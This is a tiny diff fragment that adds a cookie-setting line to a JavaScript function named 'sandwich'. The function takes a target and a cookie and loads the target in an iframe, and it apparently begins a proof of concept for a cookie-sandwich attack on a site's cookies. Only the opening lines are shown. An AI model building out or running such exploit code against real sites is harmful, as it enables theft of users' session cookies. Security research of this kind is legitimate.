@@ -1,4 +1,5 @@
 async function sandwich(target, cookie) {
+    document.cookie=`stafc=foorw1nner`
     // Step 1: Create an iframe with target src and wait for it
     const iframe = document.createElement('iframe');
 
